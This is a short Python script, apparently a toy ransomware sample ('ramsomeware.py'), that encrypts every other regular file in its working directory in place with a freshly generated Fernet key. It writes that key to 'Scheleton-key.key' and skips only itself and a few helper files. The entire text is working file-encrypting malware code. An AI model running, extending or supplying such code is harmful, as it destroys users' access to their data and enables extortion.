import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file== "ramsomeware.py" or file == "Scheleton-key.key" or file == "decryption.py" or file == "help.txt":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()
with open("Scheleton-key.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)